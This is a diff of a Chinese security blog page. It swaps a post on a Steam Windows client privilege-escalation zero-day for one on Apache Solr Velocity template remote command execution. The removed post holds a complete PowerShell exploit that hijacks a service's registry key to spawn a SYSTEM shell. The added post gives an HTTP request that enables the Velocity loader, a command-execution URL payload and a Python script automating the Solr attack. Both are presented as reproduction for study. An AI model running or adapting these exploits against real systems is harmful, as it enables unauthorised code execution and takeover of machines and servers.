@@ -4,15 +4,14 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="Steam Windows客户端本地提权0day, 朋与厌">
+    <meta name="keywords" content="Ahache Solr velocity模板命令执行漏洞, 朋与厌">
     <meta name="baidu-site-verification" content>
     <meta name="google-site-verification" content>
-    <meta name="description" content="
+    <meta name="description" content="影响版本 Apache Solr 5.x &amp;lt;= 8.2.0 
+环境搭建到Ahache Solr官网下载最新版本8.2.0,解压到当前目录。
 
-适用于Windows系统流行得Steam游戏客户端存在提权0Day漏洞，该漏洞可允许具有低权限攻击者以管理员身份运行程序
-
-漏洞描述：
-这个漏洞是由一些权限升级产生的Bug，使低权限的用户可以直接利用缺陷提升权限或以管理员身份启动可执行">
+进入到solr-8.2.0/bin/ 目录运行Solr服务。
+./solr start -e">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +19,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>Steam Windows客户端本地提权0day | 朋与厌Blog</title>
+    <title>Ahache Solr velocity模板命令执行漏洞 | 朋与厌Blog</title>
     <link rel="icon" type="image/png" href="/medias/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -308,13 +307,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        Steam Windows客户端本地提权0day
+                        Ahache Solr velocity模板命令执行漏洞
                     </div>
                 </div>
             </div>
@@ -425,8 +424,8 @@
                     
                     <div class="article-tag">
                         
-                        <a href="/tags/系统漏洞/" target="_blank">
-                            <span class="chip bg-color">系统漏洞</span>
+                        <a href="/tags/漏洞复现/" target="_blank">
+                            <span class="chip bg-color">漏洞复现</span>
                         </a>
                         
                     </div>
@@ -437,8 +436,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                        <a href="/categories/系统漏洞/" class="post-category" target="_blank">
-                            系统漏洞
+                        <a href="/categories/漏洞复现/" class="post-category" target="_blank">
+                            漏洞复现
                         </a>
                         
                     </div>
@@ -449,7 +448,7 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-09-15
+                    2019-11-01
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -463,7 +462,7 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.1k
+                    803
                 </div>
                 
 
@@ -481,51 +480,91 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><img src="https://i.loli.net/2019/09/15/QRzGdxYSFe2WuEC.png" alt="1565358388489.png"></p>
-<blockquote>
-<p>适用于Windows系统流行得Steam游戏客户端存在提权0Day漏洞，该漏洞可允许具有低权限攻击者以管理员身份运行程序</p>
-</blockquote>
-<p>漏洞描述：</p>
-<p>这个漏洞是由一些权限升级产生的Bug，使低权限的用户可以直接利用缺陷提升权限或以管理员身份启动可执行程序。由于Steam拥有超过1亿注册用户，并且一次有数百万注册的用户，这是一个严重的风险，可能被恶意软件滥用以执行挖矿各种危险操作。</p>
-<p><img src="https://i.loli.net/2019/09/15/bVTd2hUcE9oM8ux.png" alt="1565358931183.png"></p>
-<p>在Valve确定该漏洞为“严重”后，两位研究人员公开披露了Steam客户的零日漏洞。该公司选择不给予奖励赏金或表明他们会修复它，并告诉研究人员他们不被允许透露它。</p>
-<p>​    在昨天发布的一份报告中，安全研究员 <em>Felix</em>  正在分析与Steam相关的一项名为“Steam客户端服务”的Windows服务，该服务在Windows上启动了具有SYSTEM权限的可执行文件。研究人员还注意到该服务可以由“用户”组启动和停止，“用户”组几乎都是登录计算机的人。</p>
-<p>但是，此服务的注册表项不能由“用户”组写入，因此无法修改它以启动其他可执行文件并将其权限提升为管理员。</p>
-<h3 id="本地提权0day"><a href="#本地提权0day" class="headerlink" title="本地提权0day"></a>本地提权0day</h3><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p> 漏洞本身非常简单。 Steam出于某些内部目的安装“Steam客户端服务”服务。 检查服务的SDDL（<a href="https://translate.googleusercontent.com/translate_c?depth=1&rurl=translate.google.com.hk&sl=auto&sp=nmt4&tl=zh-CN&u=https://habr.com/ru/company/pm/blog/442662/&xid=17259,15700022,15700186,15700191,15700256,15700259,15700262,15700265&usg=ALkJrhg99E1VtD9Fvr-7q5sBgaM5JE2UlQ" target="_blank" rel="noopener">https://habr.com/ru/company/pm/blog/442662/</a> ）：</p>
-<p><img src="https://i.loli.net/2019/09/15/e8Cj9DPnzSF7YlX.png" alt="1565359743274.png"></p>
-<p>最有趣的部分是<em>（A ;; RPWP ;;; BU）</em> 。 这意味着允许来自“用户”组的任何用户启动和停止服务。</p>
-<p> <strong>Service</strong>枚举<code>HKLM\Software\Wow6432Node\Valve\Steam\Apps</code>的子项，并为每个子项设置一些安全描述。</p>
-<p><img src="https://i.loli.net/2019/09/15/i7BH5NXjvAKQhS3.png" alt="1565359352820.png"></p>
-<p>创建了测试密钥<code>HKLM\Software\Wow6432Node\Valve\Steam\Apps\test</code>并重新开启服务(Procmon的日志再上面)并检查了注册表密钥权限。</p>
-<p>在这里，发现<code>HKLM\SOFTWARE\Wow6432Node\Valve\Steam</code>对“Users”组具有明确的“完全控制”，并且这些权限将继承所有子项及其子项。 假设RegSetKeySecurity设置了相同的权限，如果有符号链接会发生一些有趣的事情。 我创建了一个从<code>HKLM\SOFTWARE\Wow6432Node\Valve\Steam\Apps\test</code>到<code>HKLM\SOFTWARE\test2</code>的链接，然后重新启动了该服务。</p>
-<p><img src="https://i.loli.net/2019/09/15/4tbom36vYDEpJhR.png" alt="1565359879410.png"></p>
-<p>Steam的服务为我们的目标密钥设置安全描述符。 查看SDDL以获取密钥（省略了非感兴趣的数据）：</p>
-<p><em>（A; ID; KA ;;; BU）（A; OICIIOID; GA ;;; BU）</em></p>
-<p>换句话说，它意味着对所有用户的密钥的完全（读和写）访问。 这是服务为密钥设置的安全描述符。</p>
-<p>因此，现在我们有一个原语来控制注册表中的几乎每个键，并且很容易将其转换为完整的EoP（特权升级）。 我选择与服务“Windows Installer”对应的密钥<code>HKLM\SYSTEM\ControlSet001\Services\msiserver</code>，它可以由任何用户启动，与Steam的服务相同，但运行程序为NT AUTHORITY \ SYSTEM。 控制之后，只需要更改<code>HKLM\SYSTEM\ControlSet001\Services\msiserver</code>键的ImagePath值并启动“Windows Installer”服务。 ImagePath的程序将作为<em>NT AUTHORITY\SYSTEM</em>启动。</p>
-<p><img src="https://i.loli.net/2019/09/15/ogre7RsvSJPVLYq.png" alt="1565360328809.png"></p>
-<p>将所有内容放在一起，这样就获得漏洞，允许在安装了Steam的任何Windows计算机上运行具有最高权限的任何程序。</p>
-<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre><code>//FileName SteamEop.ps1
-Write-Host &quot;[*] Installing NTObjectManager...&quot;
-install-module NTObjectManager -Scope CurrentUser -Force
-import-module NTObjectManager
-Write-Host &quot;[*] Removing HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\NSIS&quot;
-Remove-Item -Path &quot;HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\NSIS&quot;
-Write-Host &quot;[*] Creating Registry Symbolic Link from HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\NSIS to HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service&quot;
-[NtApiDotNet.NtKey]::CreateSymbolicLink(&quot;\Registry\Machine\SOFTWARE\WOW6432Node\Valve\Steam\NSIS&quot;,$null, &quot;\REGISTRY\Machine\SYSTEM\CurrentControlSet\Services\Steam Client Service&quot;)
-Write-Host &quot;[*] Registry Symbolic link created, restarting the Steam Client Service&quot;
-Get-Service &quot;Steam Client Service&quot; | Restart-Service
-Write-Host &quot;[*] Sleeping 5 seconds&quot;
-Start-Sleep 5
-Write-Host &quot;[*] DACL on HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service should be overwritten&quot;
-Write-Host &quot;[*] Modifying the binPath on the Steam Client Service...&quot;
-Set-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Services\Steam Client Service&quot; -Name &quot;ImagePath&quot; -Value &quot;C:\Windows\System32\cmd.exe /c cmd.exe&quot;
-Write-Host &quot;[*] binPath overwritten, restarting the service to trigger EoP. This will error out, just ignore it&quot;
-Get-Service &quot;Steam Client Service&quot; | Restart-Service
-Write-Host &quot;[*] Done, cmd.exe should now be running as NT AUTHORITY\SYSTEM&quot;</code></pre><p><img src="https://i.loli.net/2019/09/15/KxGzCyeJLdZ4sDX.png" alt="1565360179185.png"></p>
-<p><em>仅供参考学习 禁止犯法</em></p>
-<p>参考：<a href="https://twitter.com/PsiDragon" target="_blank" rel="noopener">https://twitter.com/PsiDragon</a></p>
-<p>​            <a href="https://www.bleepingcomputer.com/news/security/steam-zero-day-vulnerability-affects-over-100-million-users/" target="_blank" rel="noopener">https://www.bleepingcomputer.com/news/security/steam-zero-day-vulnerability-affects-over-100-million-users/</a></p>
+                <h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p> Apache Solr 5.x &lt;= 8.2.0 </p>
+<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>到<a href="https://www.apache.org/dyn/closer.lua/lucene/solr/8.2.0/solr-8.2.0.zip" target="_blank" rel="noopener">Ahache Solr官网</a>下载最新版本8.2.0,解压到当前目录。</p>
+<p><img src="https://i.loli.net/2019/11/02/qNprUEXa5zhCbRZ.png" alt="朋与厌"></p>
+<p>进入到<code>solr-8.2.0/bin/</code> 目录运行Solr服务。</p>
+<p><strong>./solr start -e cloud -force</strong>   ……..一路回车……</p>
+<p><img src="https://i.loli.net/2019/11/02/Xqpc8NnJ1b5Fzh4.png" alt="朋与厌"></p>
+<p><img src="https://i.loli.net/2019/11/02/QBzjDcEJr2VtkwN.png" alt="朋与厌"></p>
+<p>SolrCloud example running, please visit: <a href="http://localhost:8983/solr" target="_blank" rel="noopener">http://localhost:8983/solr</a> </p>
+<p><img src="https://i.loli.net/2019/11/02/sA3xJaO5yDvtEM2.png" alt="朋与厌"></p>
+<p>Collections默认创建一个节点基本能够确认搭建完成了。</p>
+<h4 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h4><p> Apache Solr默认集成<code>VelocityResponseWriter</code>插件，在该插件的初始化参数中的<code>params.resource.loader.enabled</code>这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。 </p>
+<p><img src="https://i.loli.net/2019/11/02/f3iDKFnjVwXH5vh.png" alt="朋与厌"></p>
+<p> 当设置<code>params.resource.loader.enabled</code>为true时，将允许用户通过设置请求中的参数来指定相关资源的加载，攻击者可以通过构造一个具有恶意攻击数据包，修改配置文件。导致在服务器上进行命令执行。 </p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>首先需要创建一个全新的<strong>Collection</strong> 命名为test。抓取数据包（后面会有需要用到）</p>
+<p><img src="https://i.loli.net/2019/11/02/IJ41vnU7NbGQRh8.png" alt="朋与厌"></p>
+<p>刷新浏览器可以看到一个test的项目。</p>
+<p><img src="https://i.loli.net/2019/11/02/kNcmb3lwEKe8zvV.png" alt="朋与厌"></p>
+<p>构造修改<strong>配置文件</strong>数据包</p>
+<pre class="line-numbers language-http"><code class="language-http"><span class="token request-line"><span class="token property">POST</span> http://192.168.0.154<span class="token attr-name">:8983</span>/solr/test/config HTTP/1.1</span>
+<span class="token header-name keyword">Host:</span> 192.168.0.154:8983
+<span class="token header-name keyword">Connection:</span> close
+<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate
+<span class="token header-name keyword">Accept:</span> */*
+<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
+<span class="token header-name keyword">Content-Length:</span> 250
+
+{
+  "update-queryresponsewriter": {
+    "startup": "lazy",
+    "name": "velocity",
+    "class": "solr.VelocityResponseWriter",
+    "template.base.dir": "",
+    "solr.resource.loader.enabled": "true",
+    "params.resource.loader.enabled": "true"
+  }
+}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/11/02/mUcHdnxjbqDKyA2.png" alt="朋与厌"></p>
+<p>命令执行</p>
+<pre class="line-numbers language-html"><code class="language-html">http://192.168.0.154:8983/solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+%5B1..$out.available()%5D)$str.valueOf($chr.toChars($out.read()))%23end<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://i.loli.net/2019/11/02/UXgFYxEIpdteLzf.png" alt="Rec"></p>
+<h5 id="Python脚本"><a href="#Python脚本" class="headerlink" title="Python脚本"></a>Python脚本</h5><pre><code>#!/usr/bin/env python
+# _*_ coding: utf-8 _*_
+
+
+import requests
+import urlparse
+
+def SorlAttck(url):
+    Create_node = url+&quot;/solr/admin/collections?_=1572507517815&amp;action=CREATE&amp;autoAddReplicas=false&amp;collection.configName=_default&amp;maxShardsPerNode=1&amp;name=test&amp;numShards=1&amp;replicationFactor=1&amp;router.name=compositeId&amp;wt=json&quot;
+    # //刚才抓取的创建新的节点数据包
+    Config = url+&quot;/solr/test/config&quot;
+    Config_data = &quot;&quot;&quot;{
+  &quot;update-queryresponsewriter&quot;: {
+    &quot;startup&quot;: &quot;lazy&quot;,
+    &quot;name&quot;: &quot;velocity&quot;,
+    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,
+    &quot;template.base.dir&quot;: &quot;&quot;,
+    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,
+    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;
+  }
+}&quot;&quot;&quot;
+    Poc = url+&quot;/solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&quot;
+
+    try:
+        requests.get(Create_node)
+        #// 首先创建为test的节点
+        requests.post(Config,data=Config_data)
+        #// 修改test的配置信息
+        Response = requests.get(Poc)
+        #// 发送命令执行数据包
+        if Response.status_code == 200 and &#39;uid=&#39; in Response.text and &#39;gid=&#39; in Response.text and &#39;groups=&#39; in Response.text:
+            warning_info = u&#39;[+] {} 存在Apache Solr Velocity模板远程代码执行漏洞\r\n漏洞地址:{}\r\n漏洞详情:\r\n{}&#39;.format(url, Poc, Response.text)
+            print(warning_info)
+
+        else:
+            print(&quot;[-] {} Does not exist&quot;.format(url))
+    except Exception as e:
+        pass
+
+if __name__ == &#39;__main__&#39;:
+    url = &#39;http://192.168.218.131:8983&#39;
+    SorlAttck(url)
+</code></pre><p><img src="https://i.loli.net/2019/11/02/hPQOA4useIx7HEv.png" alt="Payload"></p>
+<h3 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h3><p> <a href="https://lucene.apache.org/solr/" target="_blank" rel="noopener">https://lucene.apache.org/solr/</a> </p>
+<p> <a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt</a> </p>
 
             </div>
             <hr />
@@ -685,9 +724,9 @@ Write-Host &quot;[*] Done, cmd.exe should now be running as NT AUTHORITY\SYSTEM&
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《Steam Windows客户端本地提权0day》
+                    《Ahache Solr velocity模板命令执行漏洞》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/09/15/steam/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/11/01/solr/" property="cc:attributionName"
                rel="cc:attributionURL">
                 朋与厌
             </a> 采用
@@ -728,7 +767,7 @@ Write-Host &quot;[*] Done, cmd.exe should now be running as NT AUTHORITY\SYSTEM&
         repo: 'P1Kaju.github.io',
         owner: 'P1Kaju',
         admin: "P1Kaju",
-        id: '2019/09/15/steam/',
+        id: '2019/11/01/solr/',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -749,45 +788,47 @@ Write-Host &quot;[*] Done, cmd.exe should now be running as NT AUTHORITY\SYSTEM&
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/09/15/parsing-vulnerability/">
+                <a href="/2019/11/01/solr/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="文件解析漏洞总结">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="Ahache Solr velocity模板命令执行漏洞">
                         
-                        <span class="card-title">文件解析漏洞总结</span>
+                        <span class="card-title">Ahache Solr velocity模板命令执行漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            服务器解析漏洞算是历史比较悠久了，但如今依然广泛存在。在此记录汇总一些常见服务器的解析漏洞，比如IIS6.0、IIS7.5、apache、nginx等方便以后回顾温习。
+                            国外安全研究员 s00py 在 Twitter 公开了 Apache Solr Velocity 模版注入远程命令执行的 EXP
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-15
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-01
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Web漏洞/" class="post-category" target="_blank">
-                                    Web漏洞
+                            <a href="/categories/漏洞复现/" class="post-category" target="_blank">
+                                    漏洞复现
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Web漏洞/" target="_blank">
-                        <span class="chip bg-color">Web漏洞</span>
+                    <a href="/tags/漏洞复现/" target="_blank">
+                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
                 </div>
@@ -801,30 +842,30 @@ Write-Host &quot;[*] Done, cmd.exe should now be running as NT AUTHORITY\SYSTEM&
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/09/14/1039/">
+                <a href="/2019/10/26/app-traffic-general-packet-capture-method/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="1039家校通漏洞总结">
+                        <img src="https://i.loli.net/2019/10/26/WNuODJyGAkSp2lH.jpg" class="responsive-img" alt="渗透测试 APP流量通用抓包方法">
                         
-                        <span class="card-title">1039家校通漏洞总结</span>
+                        <span class="card-title">渗透测试 APP流量通用抓包方法</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            北京壹零叁玖科技发展有限公司(简称1039公司)是国内第一家专业从事培训行业标准化软件开发和大型应用性平台的高科技企业，是培训行业信息化建设的最佳合作伙伴。
+                            好久不见，距离上一次水文章已经两个月过去了。 非常抱歉，让大家久等了。
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-14
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-26
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Web漏洞/" class="post-category" target="_blank">
-                                    Web漏洞
+                            <a href="/categories/渗透测试/" class="post-category" target="_blank">
+                                    渗透测试
                                 </a>
                             
                             
@@ -834,8 +875,8 @@ Write-Host &quot;[*] Done, cmd.exe should now be running as NT AUTHORITY\SYSTEM&
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Web漏洞/" target="_blank">
-                        <span class="chip bg-color">Web漏洞</span>
+                    <a href="/tags/渗透测试/" target="_blank">
+                        <span class="chip bg-color">渗透测试</span>
                     </a>
                     
                 </div>
@@ -982,13 +1023,6 @@ Write-Host &quot;[*] Done, cmd.exe should now be running as NT AUTHORITY\SYSTEM&
 
 </main>
 
-
-<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
-<script>
-    MathJax.Hub.Config({
-        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
-    });
-</script>
 
 <footer class="page-footer bg-color">
     <div class="container row center-align">
